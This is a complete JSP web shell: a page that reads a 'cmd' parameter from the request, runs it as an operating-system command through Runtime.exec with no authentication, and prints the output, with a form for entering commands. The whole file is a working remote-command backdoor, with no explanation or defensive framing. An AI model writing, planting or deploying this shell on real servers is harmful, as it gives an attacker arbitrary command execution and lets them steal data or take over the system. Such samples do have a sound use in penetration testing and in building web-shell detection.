<%@ page import="java.io.*" %>
<html>
<body>
<pre>
<%
if (request.getParameter("cmd") != null) {
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line);
    }
}
%>
</pre>
<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>
</body>
</html>
